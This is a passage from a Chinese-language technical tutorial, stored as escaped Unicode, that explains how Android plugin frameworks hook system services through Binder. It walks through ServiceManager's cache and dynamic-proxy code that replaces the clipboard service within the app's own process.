\u4f7f\u7528\u8fd9\u4e9b\u7cfb\u7edf\u670d\u52a1\uff0c\u81ea\u7136\u4f1a\u5bf9\u8fd9\u4e9b\u7cfb\u7edf\u670d\u52a1\u505a\u51fa\u4e00\u5b9a\u7684\u6539\u9020(Hook)\uff0c\u4f7f\u5f97\u63d2\u4ef6\u7684\u5f00\u53d1\u548c\u4f7f\u7528\u66f4\u52a0\u65b9\u4fbf\uff0c\u4ece\u800c\u5927\u5927\u964d\u4f4e\u63d2\u4ef6\u7684\u5f00\u53d1\u548c\u7ef4\u62a4\u6210\u672c\u3002\u6bd4\u5982\uff0cHook\u4f4f ActivityManagerService \u53ef\u4ee5\u8ba9\u63d2\u4ef6\u65e0\u7f1d\u5730\u4f7f\u7528 startActivity \u65b9\u6cd5\u800c\u4e0d\u662f\u4f7f\u7528\u7279\u5b9a\u7684\u65b9\u5f0f(\u6bd4\u5982that\u8bed\u6cd5)\u6765\u542f\u52a8\u63d2\u4ef6\u6216\u8005\u4e3b\u7a0b\u5e8f\u7684\u4efb\u610f\u754c\u9762\u3002 \u6211\u4eec\u628a\u8fd9\u79cdHook\u7cfb\u7edf\u670d\u52a1\u7684\u673a\u5236\u79f0\u4e4b\u4e3aBinder Hook\uff0c\u56e0\u4e3a\u672c\u8d28\u4e0a\u8fd9\u4e9b\u670d\u52a1\u63d0\u4f9b\u8005\u90fd\u662f\u5b58\u5728\u4e8e\u7cfb\u7edf\u5404\u4e2a\u8fdb\u7a0b\u7684Binder\u5bf9\u8c61\u3002\u56e0\u6b64\uff0c\u8981\u7406\u89e3\u63a5\u4e0b\u6765\u7684\u5185\u5bb9\u5fc5\u987b\u4e86\u89e3Android\u7684Binder\u673a\u5236\uff0c\u53ef\u4ee5\u53c2\u8003\u6211\u4e4b\u524d\u7684\u6587\u7ae0 Binder\u5b66\u4e60\u6307\u5357 \u9605\u8bfb\u672c\u6587\u4e4b\u524d\uff0c\u53ef\u4ee5\u5148clone\u4e00\u4efd understand-plugin-framework \uff0c\u53c2\u8003\u6b64\u9879\u76ee\u7684 binder-hook \u6a21\u5757\u3002\u53e6\u5916\uff0c\u63d2\u4ef6\u6846\u67b6\u539f\u7406\u89e3\u6790\u7cfb\u5217\u6587\u7ae0\u89c1 \u7d22\u5f15 \u3002 \u7cfb\u7edf\u670d\u52a1\u7684\u83b7\u53d6\u8fc7\u7a0b \u6211\u4eec\u77e5\u9053\u7cfb\u7edf\u7684\u5404\u4e2a\u8fdc\u7a0bservice\u5bf9\u8c61\u90fd\u662f\u4ee5Binder\u7684\u5f62\u5f0f\u5b58\u5728\u7684\uff0c\u800c\u8fd9\u4e9bBinder\u6709\u4e00\u4e2a\u7ba1\u7406\u8005\uff0c\u90a3\u5c31\u662f ServiceManager \uff1b\u6211\u4eec\u8981Hook\u6389\u8fd9\u4e9bservice\uff0c\u81ea\u7136\u8981\u4ece\u8fd9\u4e2a ServiceManager \u4e0b\u624b\uff0c\u4e0d\u7136\u661f\u7f57\u68cb\u5e03\u7684Binder\u5e7f\u6cdb\u5b58\u5728\u4e8e\u7cfb\u7edf\u7684\u5404\u4e2a\u89d2\u843d\uff0c\u8981\u4e00\u4e2a\u4e2a\u627e\u51fa\u6765\u8fd8\u771f\u662f\u5927\u6d77\u635e\u9488\u3002 \u56de\u60f3\u4e00\u4e0b\u6211\u4eec\u4f7f\u7528\u7cfb\u7edf\u670d\u52a1\u7684\u65f6\u5019\u662f\u600e\u4e48\u5e72\u7684\uff0c\u60f3\u5fc5\u8fd9\u4e2a\u5927\u5bb6\u4e00\u5b9a\u518d\u719f\u6089\u4e0d\u8fc7\u4e86\uff1a\u901a\u8fc7 Context \u5bf9\u8c61\u7684 getSystemService \u65b9\u6cd5\uff1b\u6bd4\u5982\u8981\u4f7f\u7528 ActivityManager \uff1a ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE); \u53ef\u662f\u8fd9\u4e2a\u8c8c\u4f3c\u8ddf ServiceManager \u6ca1\u6709\u4ec0\u4e48\u5173\u7cfb\u554a\uff1f\u6211\u4eec\u518d\u67e5\u770b getSystemService \u65b9\u6cd5\uff1b(Context\u7684\u5b9e\u73b0\u5728 ContextImpl \u91cc\u9762)\uff1a public Object getSystemService(String name) { ServiceFetcher fetcher = SYSTEM_SERVICE_MAP.get(name); return fetcher == null ? null : fetcher.getService(this);} \u5f88\u7b80\u5355\uff0c\u6240\u6709\u7684service\u5bf9\u8c61\u90fd\u4fdd\u5b58\u5728\u4e00\u5f20 map \u91cc\u9762\uff0c\u6211\u4eec\u518d\u770b\u8fd9\u4e2amap\u662f\u600e\u4e48\u521d\u59cb\u5316\u7684\uff1a registerService(ACCOUNT_SERVICE, new ServiceFetcher() { public Object createService(ContextImpl ctx) { IBinder b = ServiceManager.getService(ACCOUNT_SERVICE); IAccountManager service = IAccountManager.Stub.asInterface(b); return new AccountManager(ctx, service); }}); \u5728 ContextImpl \u7684\u9759\u6001\u521d\u59cb\u5316\u5757\u91cc\u9762\uff0c\u6709\u7684Service\u662f\u50cf\u4e0a\u9762\u8fd9\u6837\u521d\u59cb\u5316\u7684\uff1b\u53ef\u4ee5\u770b\u5230\uff0c\u786e\u5b9e\u4f7f\u7528\u4e86 ServiceManager \uff1b\u5f53\u7136\u8fd8\u6709\u4e00\u4e9bservice\u5e76\u6ca1\u6709\u76f4\u63a5\u4f7f\u7528 ServiceManager \uff0c\u800c\u662f\u505a\u4e86\u4e00\u5c42\u5305\u88c5\u5e76\u8fd4\u56de\u4e86\u8fd9\u4e2a\u5305\u88c5\u5bf9\u8c61\uff0c\u6bd4\u5982\u6211\u4eec\u7684 ActivityManager \uff0c\u5b83\u8fd4\u56de\u7684\u662f ActivityManager \u8fd9\u4e2a\u5305\u88c5\u5bf9\u8c61\uff1a registerService(ACTIVITY_SERVICE, new ServiceFetcher() { public Object createService(ContextImpl ctx) { return new ActivityManager(ctx.getOuterContext(), ctx.mMainThread.getHandler()); }}); \u4f46\u662f\u5728 ActivityManager \u8fd9\u4e2a\u7c7b\u5185\u90e8\uff0c\u4e5f\u4f7f\u7528\u4e86 ServiceManager \uff1b\u5177\u4f53\u6765\u8bf4\uff0c\u56e0\u4e3aActivityManager\u91cc\u9762\u6240\u6709\u7684\u6838\u5fc3\u64cd\u4f5c\u90fd\u662f\u4f7f\u7528 ActivityManagerNative.getDefault() \u5b8c\u6210\u7684\u3002\u90a3\u4e48\u8fd9\u4e2a\u8bed\u53e5\u5e72\u4e86\u4ec0\u4e48\u5462\uff1f private static final Singleton<IActivityManager> gDefault = new Singleton<IActivityManager>() { protected IActivityManager create() { IBinder b = ServiceManager.getService(\"activity\"); IActivityManager am = asInterface(b); return am; } }; \u56e0\u6b64\uff0c\u901a\u8fc7\u5206\u6790\u6211\u4eec\u5f97\u77e5\uff0c\u7cfb\u7edfService\u7684\u4f7f\u7528\u5176\u5b9e\u5c31\u5206\u4e3a\u4e24\u6b65\uff1a IBinder b = ServiceManager.getService(\"service_name\"); // \u83b7\u53d6\u539f\u59cb\u7684IBinder\u5bf9\u8c61IXXInterface in = IXXInterface.Stub.asInterface(b); // \u8f6c\u6362\u4e3aService\u63a5\u53e3 \u5bfb\u627eHook\u70b9 \u5728 \u63d2\u4ef6\u6846\u67b6\u539f\u7406\u89e3\u6790\u2014\u2014Hook\u673a\u5236\u4e4b\u52a8\u6001\u4ee3\u7406 \u91cc\u9762\u6211\u4eec\u8bf4\u8fc7\uff0cHook\u5206\u4e3a\u4e09\u6b65\uff0c\u6700\u5173\u952e\u7684\u4e00\u6b65\u5c31\u662f\u5bfb\u627eHook\u70b9\u3002\u6211\u4eec\u73b0\u5728\u5df2\u7ecf\u641e\u6e05\u695a\u4e86\u7cfb\u7edf\u670d\u52a1\u7684\u4f7f\u7528\u8fc7\u7a0b\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u627e\u51fa\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u5728\u54ea\u4e2a\u73af\u8282\u662f\u6700\u5408\u9002hook\u7684\u3002 \u7531\u4e8e\u7cfb\u7edf\u670d\u52a1\u7684\u4f7f\u7528\u8005\u90fd\u662f\u5bf9\u7b2c\u4e8c\u6b65\u83b7\u53d6\u5230\u7684 IXXInterface \u8fdb\u884c\u64cd\u4f5c\uff0c\u56e0\u6b64\u5982\u679c\u6211\u4eec\u8981hook\u6389\u67d0\u4e2a\u7cfb\u7edf\u670d\u52a1\uff0c \u53ea\u9700\u8981\u628a\u7b2c\u4e8c\u6b65\u7684 asInterface \u65b9\u6cd5\u8fd4\u56de\u7684\u5bf9\u8c61\u4fee\u6539\u4e3a\u4e3a\u6211\u4eecHook\u8fc7\u7684\u5bf9\u8c61\u5c31\u53ef\u4ee5\u4e86\u3002 asInterface\u8fc7\u7a0b \u63a5\u4e0b\u6765\u6211\u4eec\u5206\u6790 asInterface \u65b9\u6cd5\uff0c\u7136\u540e\u60f3\u529e\u6cd5\u628a\u8fd9\u4e2a\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u4fee\u6539\u4e3a\u6211\u4eecHook\u8fc7\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u3002\u8fd9\u91cc\u6211\u4eec\u4ee5\u7cfb\u7edf\u526a\u5207\u7248\u670d\u52a1\u4e3a\u4f8b\uff0c\u6e90\u7801\u4f4d\u7f6e\u4e3a android.content.IClipboard , IClipboard.Stub.asInterface \u65b9\u6cd5\u4ee3\u7801\u5982\u4e0b\uff1a public static android.content.IClipboard asInterface(android.os.IBinder obj) { if ((obj == null)) { return null; } android.os.IInterface iin = obj.queryLocalInterface(DESCRIPTOR); // Hook\u70b9 if (((iin != null) && (iin instanceof android.content.IClipboard))) { return ((android.content.IClipboard) iin); } return new android.content.IClipboard.Stub.Proxy(obj);} \u8fd9\u4e2a\u65b9\u6cd5\u7684\u610f\u601d\u5c31\u662f\uff1a\u5148\u67e5\u770b\u672c\u8fdb\u7a0b\u662f\u5426\u5b58\u5728\u8fd9\u4e2aBinder\u5bf9\u8c61\uff0c\u5982\u679c\u6709\u90a3\u4e48\u76f4\u63a5\u5c31\u662f\u672c\u8fdb\u7a0b\u8c03\u7528\u4e86\uff1b\u5982\u679c\u4e0d\u5b58\u5728\u90a3\u4e48\u521b\u5efa\u4e00\u4e2a\u4ee3\u7406\u5bf9\u8c61\uff0c\u8ba9\u4ee3\u7406\u5bf9\u8c61\u59d4\u6258\u9a71\u52a8\u5b8c\u6210\u8de8\u8fdb\u7a0b\u8c03\u7528\u3002 \u89c2\u5bdf\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u524d\u9762\u7684\u90a3\u4e2aif\u8bed\u53e5\u5224\u7a7a\u8fd4\u56de\u80af\u5b9a\u52a8\u4e0d\u4e86\u624b\u811a\uff1b\u6700\u540e\u4e00\u53e5\u8c03\u7528\u6784\u9020\u51fd\u6570\u7136\u540e\u76f4\u63a5\u8fd4\u56de\u6211\u4eec\u4e5f\u662f\u65e0\u4ece\u4e0b\u624b\uff0c\u8981\u4fee\u6539 asInterface \u65b9\u6cd5\u7684\u8fd4\u56de\u503c\uff0c\u6211\u4eec\u552f\u4e00\u80fd\u505a\u7684\u5c31\u662f\u4ece\u8fd9\u4e00\u53e5\u4e0b\u624b\uff1a android.os.IInterface iin = obj.queryLocalInterface(DESCRIPTOR); // Hook\u70b9 \u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u4fee\u6539\u8fd9\u4e2a obj \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u7684\u8fd4\u56de\u503c\uff0c\u5e76\u4fdd\u8bc1\u8fd9\u4e2a\u8fd4\u56de\u503c\u7b26\u5408\u63a5\u4e0b\u6765\u7684 if \u6761\u4ef6\u68c0\u6d4b\uff0c\u90a3\u4e48\u5c31\u8fbe\u5230\u4e86\u4fee\u6539 asInterface \u65b9\u6cd5\u8fd4\u56de\u503c\u7684\u76ee\u7684\u3002 \u800c\u8fd9\u4e2a obj \u5bf9\u8c61\u521a\u597d\u662f\u6211\u4eec\u7b2c\u4e00\u6b65\u8fd4\u56de\u7684 IBinder \u5bf9\u8c61\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u5c1d\u8bd5\u5bf9\u8fd9\u4e2a IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u8fdb\u884chook\u3002 getService\u8fc7\u7a0b \u4e0a\u6587\u5206\u6790\u5f97\u77e5\uff0c\u6211\u4eec\u60f3\u8981\u4fee\u6539 IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\uff1b\u83b7\u53d6 IBinder \u5bf9\u8c61\u7684\u8fc7\u7a0b\u5982\u4e0b\uff1a IBinder b = ServiceManager.getService(\"service_name\"); \u56e0\u6b64\uff0c\u6211\u4eec\u5e0c\u671b\u80fd\u4fee\u6539\u8fd9\u4e2a getService \u65b9\u6cd5\u7684\u8fd4\u56de\u503c\uff0c\u8ba9\u8fd9\u4e2a\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6211\u4eec\u4f2a\u9020\u8fc7\u7684 IBinder \u5bf9\u8c61\uff1b\u8fd9\u6837\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u81ea\u5df1\u4f2a\u9020\u7684 IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u4f5c\u5904\u7406\uff0c\u8fdb\u800c\u4f7f\u5f97 asInterface \u65b9\u6cd5\u8fd4\u56de\u5728 queryLocalInterface \u65b9\u6cd5\u91cc\u9762\u5904\u7406\u8fc7\u7684\u503c\uff0c\u6700\u7ec8\u5b9e\u73b0hook\u7cfb\u7edf\u670d\u52a1\u7684\u76ee\u7684\u3002 \u5728\u8ddf\u8e2a\u8fd9\u4e2a getService \u65b9\u6cd5\u4e4b\u524d\u6211\u4eec\u601d\u8003\u4e00\u4e0b\uff0c\u7531\u4e8e\u7cfb\u7edf\u670d\u52a1\u662f\u4e00\u7cfb\u5217\u7684\u8fdc\u7a0bService\uff0c\u5b83\u4eec\u7684\u672c\u4f53\uff0c\u4e5f\u5c31\u662fBinder\u672c\u5730\u5bf9\u8c61\u4e00\u822c\u90fd\u5b58\u5728\u4e8e\u67d0\u4e2a\u5355\u72ec\u7684\u8fdb\u7a0b\uff0c\u5728\u8fd9\u4e2a\u8fdb\u7a0b\u4e4b\u5916\u7684\u5176\u4ed6\u8fdb\u7a0b\u5b58\u5728\u7684\u90fd\u662f\u8fd9\u4e9bBinder\u672c\u5730\u5bf9\u8c61\u7684\u4ee3\u7406\u3002\u56e0\u6b64\u5728\u6211\u4eec\u7684\u8fdb\u7a0b\u91cc\u9762\uff0c\u5b58\u5728\u7684\u4e5f\u53ea\u662f\u8fd9\u4e2aBinder\u4ee3\u7406\u5bf9\u8c61\uff0c\u6211\u4eec\u4e5f\u53ea\u80fd\u5bf9\u8fd9\u4e9bBinder\u4ee3\u7406\u5bf9\u8c61\u4e0b\u624b\u3002(\u5982\u679c\u8fd9\u4e00\u6bb5\u770b\u4e0d\u61c2\uff0c\u5efa\u8bae\u4e0d\u8981\u5f80\u4e0b\u770b\u4e86\uff0c\u5148\u770b Binder\u5b66\u4e60\u6307\u5357 ) \u7136\u540e\uff0c\u8fd9\u4e2a getService \u662f\u4e00\u4e2a\u9759\u6001\u65b9\u6cd5\uff0c\u5982\u679c\u6b64\u65b9\u6cd5\u4ec0\u4e48\u90fd\u4e0d\u505a\uff0c\u62ff\u5230Binder\u4ee3\u7406\u5bf9\u8c61\u4e4b\u540e\u76f4\u63a5\u8fd4\u56de\uff1b\u90a3\u4e48\u6211\u4eec\u5c31\u65e0\u80fd\u4e3a\u529b\u4e86\uff1a\u6211\u4eec\u6ca1\u6709\u529e\u6cd5\u62e6\u622a\u4e00\u4e2a\u9759\u6001\u65b9\u6cd5\uff0c\u4e5f\u6ca1\u6709\u529e\u6cd5\u83b7\u53d6\u5230\u8fd9\u4e2a\u9759\u6001\u65b9\u6cd5\u91cc\u9762\u7684\u5c40\u90e8\u53d8\u91cf(\u5373\u6211\u4eec\u5e0c\u671b\u4fee\u6539\u7684\u90a3\u4e2aBinder\u4ee3\u7406\u5bf9\u8c61)\u3002 \u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u770b\u8fd9\u4e2a getService \u7684\u4ee3\u7801\u4e86\uff1a public static IBinder getService(String name) { try { IBinder service = sCache.get(name); if (service != null) { return service; } else { return getIServiceManager().getService(name); } } catch (RemoteException e) { Log.e(TAG, \"error in getService\", e); } return null;} \u5929\u65e0\u7edd\u4eba\u4e4b\u8def\uff01 ServiceManager \u4e3a\u4e86\u907f\u514d\u6bcf\u6b21\u90fd\u8fdb\u884c\u8de8\u8fdb\u7a0b\u901a\u4fe1\uff0c\u628a\u8fd9\u4e9bBinder\u4ee3\u7406\u5bf9\u8c61\u7f13\u5b58\u5728\u4e00\u5f20 map \u91cc\u9762\u3002 \u6211\u4eec\u53ef\u4ee5\u66ff\u6362\u8fd9\u4e2amap\u91cc\u9762\u7684\u5185\u5bb9\u4e3aHook\u8fc7\u7684 IBinder \u5bf9\u8c61\uff0c\u7531\u4e8e\u7cfb\u7edf\u5728 getService \u7684\u65f6\u5019\u6bcf\u6b21\u90fd\u4f1a\u4f18\u5148\u67e5\u627e\u7f13\u5b58\uff0c\u56e0\u6b64\u8fd4\u56de\u7ed9\u4f7f\u7528\u8005\u7684\u90fd\u662f\u88ab\u6211\u4eec\u4fee\u6539\u8fc7\u7684\u5bf9\u8c61\uff0c\u4ece\u800c\u8fbe\u5230\u7792\u5929\u8fc7\u6d77\u7684\u76ee\u7684\u3002 \u603b\u7ed3\u4e00\u4e0b\uff0c\u8981\u8fbe\u5230\u4fee\u6539\u7cfb\u7edf\u670d\u52a1\u7684\u76ee\u7684\uff0c\u6211\u4eec\u9700\u8981\u5982\u4e0b\u4e24\u6b65\uff1a \u9996\u5148\u80af\u5b9a\u9700\u8981 \u4f2a\u9020\u4e00\u4e2a\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61 \uff0c\u63a5\u4e0b\u6765\u5c31\u8981\u60f3\u529e\u6cd5\u8ba9 asInterface \u80fd\u591f\u8fd4\u56de\u6211\u4eec\u7684\u8fd9\u4e2a\u4f2a\u9020\u5bf9\u8c61\u800c\u4e0d\u662f\u539f\u59cb\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u3002 \u901a\u8fc7\u4e0a\u6587\u5206\u6790\u6211\u4eec\u77e5\u9053\uff0c\u53ea\u8981\u8ba9 getService \u8fd4\u56de IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u76f4\u63a5\u8fd4\u56de\u6211\u4eec\u4f2a\u9020\u8fc7\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u5c31\u80fd\u8fbe\u5230\u76ee\u7684\u3002\u6240\u4ee5\uff0c\u6211\u4eec\u9700\u8981 \u4f2a\u9020\u4e00\u4e2aIBinder\u5bf9\u8c61 \uff0c\u4e3b\u8981\u662f\u4fee\u6539\u5b83\u7684 queryLocalInterface \u65b9\u6cd5\uff0c\u8ba9\u5b83\u8fd4\u56de\u6211\u4eec\u4f2a\u9020\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\uff1b\u7136\u540e\u628a\u8fd9\u4e2a\u4f2a\u9020\u5bf9\u8c61\u653e\u7f6e\u5728 ServiceManager \u7684\u7f13\u5b58 map \u91cc\u9762\u5373\u53ef\u3002 \u6211\u4eec\u901a\u8fc7Binder\u673a\u5236\u7684 \u4f18\u5148\u67e5\u627e\u672c\u5730Binder\u5bf9\u8c61 \u7684\u8fd9\u4e2a\u7279\u6027\u8fbe\u5230\u4e86Hook\u6389\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u7684\u76ee\u7684\u3002\u56e0\u6b64 queryLocalInterface \u4e5f\u5931\u53bb\u4e86\u5b83\u539f\u672c\u7684\u610f\u4e49(\u53ea\u67e5\u627e\u672c\u5730Binder\u5bf9\u8c61\uff0c\u6ca1\u6709\u672c\u5730\u5bf9\u8c61\u8fd4\u56denull)\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u53ea\u662f\u4e00\u4e2a\u5080\u5121\uff0c\u662f\u6211\u4eec\u5b9e\u73b0hook\u7cfb\u7edf\u5bf9\u8c61\u7684\u6865\u6881\uff1a\u6211\u4eec\u901a\u8fc7\u8fd9\u4e2a\u201c\u6f0f\u6d1e\u201d\u8ba9 asInterface \u6c38\u8fdc\u90fd\u8fd4\u56de\u6211\u4eec\u4f2a\u9020\u8fc7\u7684\u5bf9\u8c61\u3002\u7531\u4e8e\u6211\u4eec\u63a5\u7ba1\u4e86 asInterface \u8fd9\u4e2a\u65b9\u6cd5\u7684\u5168\u90e8\uff0c\u6211\u4eec\u4f2a\u9020\u8fc7\u7684\u8fd9\u4e2a\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u4e0d\u80fd\u662f\u53ea\u62e5\u6709\u672c\u5730Binder\u5bf9\u8c61(\u539f\u59cb queryLocalInterface \u65b9\u6cd5\u8fd4\u56de\u7684\u5bf9\u8c61)\u7684\u80fd\u529b\uff0c\u8fd8\u8981\u6709Binder\u4ee3\u7406\u5bf9\u8c61\u64cd\u7eb5\u9a71\u52a8\u7684\u80fd\u529b\u3002 \u63a5\u4e0b\u6765\u6211\u4eec\u5c31\u4ee5Hook\u7cfb\u7edf\u7684\u526a\u5207\u7248\u670d\u52a1\u4e3a\u4f8b\uff0c\u7528\u5b9e\u9645\u4ee3\u7801\u6765\u8bf4\u660e\uff0c\u5982\u4f55Hook\u6389\u7cfb\u7edf\u670d\u52a1\u3002 Hook\u7cfb\u7edf\u526a\u5207\u7248\u670d\u52a1 \u4f2a\u9020\u526a\u5207\u7248\u670d\u52a1\u5bf9\u8c61 \u9996\u5148\u6211\u4eec\u7528\u4ee3\u7406\u7684\u65b9\u5f0f\u4f2a\u9020\u4e00\u4e2a\u526a\u5207\u7248\u670d\u52a1\u5bf9\u8c61\uff0c\u5173\u4e8e\u5982\u4f55\u4f7f\u7528\u4ee3\u7406\u7684\u65b9\u5f0f\u8fdb\u884chook\u4ee5\u53ca\u5176\u4e2d\u7684\u539f\u7406\uff0c\u53ef\u4ee5\u67e5\u770b \u63d2\u4ef6\u6846\u67b6\u539f\u7406\u89e3\u6790\u2014\u2014Hook\u673a\u5236\u4e4b\u52a8\u6001\u4ee3\u7406 \u3002 \u5177\u4f53\u4ee3\u7801\u5982\u4e0b\uff0c\u6211\u4eec\u7528\u52a8\u6001\u4ee3\u7406\u7684\u65b9\u5f0fHook\u6389\u4e86 hasPrimaryClip() \uff0c getPrimaryClip() \u8fd9\u4e24\u4e2a\u65b9\u6cd5\uff1a public class BinderHookHandler implements InvocationHandler { private static final String TAG = \"BinderHookHandler\"; // \u539f\u59cb\u7684Service\u5bf9\u8c61 (IInterface) Object base; public BinderHookHandler(IBinder base, Class<?> stubClass) { try { Method asInterfaceMethod = stubClass.getDeclaredMethod(\"asInterface\", IBinder.class); // IClipboard.Stub.asInterface(base); this.base = asInterfaceMethod.invoke(null, base); } catch (Exception e) { throw new RuntimeException(\"hooked failed!\"); } } @TargetApi(Build.VERSION_CODES.HONEYCOMB) @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { // \u628a\u526a\u5207\u7248\u7684\u5185\u5bb9\u66ff\u6362\u4e3a \"you are hooked\" if (\"getPrimaryClip\".equals(method.getName())) { Log.d(TAG, \"hook getPrimaryClip\"); return ClipData.newPlainText(null, \"you are hooked\"); } // \u6b3a\u9a97\u7cfb\u7edf,\u4f7f\u4e4b\u8ba4\u4e3a\u526a\u5207\u7248\u4e0a\u4e00\u76f4\u6709\u5185\u5bb9 if (\"hasPrimaryClip\".equals(method.getName())) { return true; } return method.invoke(base, args); }} \u6ce8\u610f\uff0c\u6211\u4eec\u62ff\u5230\u539f\u59cb\u7684 IBinder \u5bf9\u8c61\u4e4b\u540e\uff0c\u5982\u679c\u6211\u4eec\u5e0c\u671b\u4f7f\u7528\u88abHook\u4e4b\u524d\u7684\u7cfb\u7edf\u670d\u52a1\uff0c\u5e76\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528\u8fd9\u4e2a IBinder \u5bf9\u8c61\uff0c\u800c\u662f\u9700\u8981\u4f7f\u7528 asInterface \u65b9\u6cd5\u5c06\u5b83\u8f6c\u6362\u4e3a IClipboard \u63a5\u53e3\uff1b\u56e0\u4e3a getService \u65b9\u6cd5\u8fd4\u56de\u7684 IBinder \u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a \u88f8Binder\u4ee3\u7406\u5bf9\u8c61 \uff0c\u5b83\u53ea\u6709\u4e0e\u9a71\u52a8\u6253\u4ea4\u9053\u7684\u80fd\u529b\uff0c\u4f46\u662f\u5b83\u5e76\u4e0d\u80fd\u72ec\u7acb\u5de5\u4f5c\uff0c\u9700\u8981\u4eba\u6307\u6325\u5b83\uff1b asInterface \u65b9\u6cd5\u8fd4\u56de\u7684 IClipboard.Stub.Proxy \u7c7b\u7684\u5bf9\u8c61\u901a\u8fc7\u64cd\u7eb5\u8fd9\u4e2a\u88f8 BinderProxy \u5bf9\u8c61\u4ece\u800c\u5b9e\u73b0\u4e86\u5177\u4f53\u7684 IClipboard \u63a5\u53e3\u5b9a\u4e49\u7684\u64cd\u4f5c\u3002 \u4f2a\u9020 IBinder \u5bf9\u8c61 \u5728\u4e0a\u4e00\u6b65\u4e2d\uff0c\u6211\u4eec\u5df2\u7ecf\u4f2a\u9020\u597d\u4e86\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\uff0c\u73b0\u5728\u8981\u505a\u7684\u5c31\u662f\u60f3\u529e\u6cd5\u8ba9 asInterface \u65b9\u6cd5\u8fd4\u56de\u6211\u4eec\u4f2a\u9020\u7684\u5bf9\u8c61\u4e86\uff1b\u6211\u4eec\u4f2a\u9020\u4e00\u4e2a IBinder \u5bf9\u8c61\uff1a public class BinderProxyHookHandler implements InvocationHandler { private static final String TAG = \"BinderProxyHookHandler\"; // \u7edd\u5927\u90e8\u5206\u60c5\u51b5\u4e0b,\u8fd9\u662f\u4e00\u4e2aBinderProxy\u5bf9\u8c61 // \u53ea\u6709\u5f53Service\u548c\u6211\u4eec\u5728\u540c\u4e00\u4e2a\u8fdb\u7a0b\u7684\u65f6\u5019\u624d\u662fBinder\u672c\u5730\u5bf9\u8c61 // \u8fd9\u4e2a\u57fa\u672c\u4e0d\u53ef\u80fd IBinder base; Class<?> stub; Class<?> iinterface; public BinderProxyHookHandler(IBinder base) { this.base = base; try { this.stub = Class.forName(\"android.content.IClipboard$Stub\"); this.iinterface = Class.forName(\"android.content.IClipboard\"); } catch (ClassNotFoundException e) { e.printStackTrace(); } } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { if (\"queryLocalInterface\".equals(method.getName())) { Log.d(TAG, \"hook queryLocalInterface\"); // \u8fd9\u91cc\u76f4\u63a5\u8fd4\u56de\u771f\u6b63\u88abHook\u6389\u7684Service\u63a5\u53e3 // \u8fd9\u91cc\u7684 queryLocalInterface \u5c31\u4e0d\u662f\u539f\u672c\u7684\u610f\u601d\u4e86 // \u6211\u4eec\u80af\u5b9a\u4e0d\u4f1a\u771f\u7684\u8fd4\u56de\u4e00\u4e2a\u672c\u5730\u63a5\u53e3, \u56e0\u4e3a\u6211\u4eec\u63a5\u7ba1\u4e86 asInterface\u65b9\u6cd5\u7684\u4f5c\u7528 // \u56e0\u6b64\u5fc5\u987b\u662f\u4e00\u4e2a\u5b8c\u6574\u7684 asInterface \u8fc7\u7684 IInterface\u5bf9\u8c61, \u65e2\u8981\u5904\u7406\u672c\u5730\u5bf9\u8c61,\u4e5f\u8981\u5904\u7406\u4ee3\u7406\u5bf9\u8c61 // \u8fd9\u53ea\u662f\u4e00\u4e2aHook\u70b9\u800c\u5df2, \u5b83\u539f\u59cb\u7684\u542b\u4e49\u5df2\u7ecf\u88ab\u6211\u4eec\u91cd\u5b9a\u4e49\u4e86; \u56e0\u4e3a\u6211\u4eec\u4f1a\u6c38\u8fdc\u786e\u4fdd\u8fd9\u4e2a\u65b9\u6cd5\u4e0d\u8fd4\u56denull // \u8ba9 IClipboard.Stub.asInterface \u6c38\u8fdc\u8d70\u5230if\u8bed\u53e5\u7684else\u5206\u652f\u91cc\u9762 return Proxy.newProxyInstance(proxy.getClass().getClassLoader(), // asInterface \u7684\u65f6\u5019\u4f1a\u68c0\u6d4b\u662f\u5426\u662f\u7279\u5b9a\u7c7b\u578b\u7684\u63a5\u53e3\u7136\u540e\u8fdb\u884c\u5f3a\u5236\u8f6c\u6362 // \u56e0\u6b64\u8fd9\u91cc\u7684\u52a8\u6001\u4ee3\u7406\u751f\u6210\u7684\u7c7b\u578b\u4fe1\u606f\u7684\u7c7b\u578b\u5fc5\u987b\u662f\u6b63\u786e\u7684 new Class[] { IBinder.class, IInterface.class, this.iinterface }, new BinderHookHandler(base, stub)); } Log.d(TAG, \"method:\" + method.getName()); return method.invoke(base, args); }} \u6211\u4eec\u4f7f\u7528\u52a8\u6001\u4ee3\u7406\u7684\u65b9\u5f0f\u4f2a\u9020\u4e86\u4e00\u4e2a\u8ddf\u539f\u59cb IBinder \u4e00\u6a21\u4e00\u6837\u7684\u5bf9\u8c61\uff0c\u7136\u540e\u5728\u8fd9\u4e2a\u4f2a\u9020\u7684 IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u91cc\u9762\u8fd4\u56de\u4e86\u6211\u4eec\u7b2c\u4e00\u6b65\u521b\u5efa\u7684 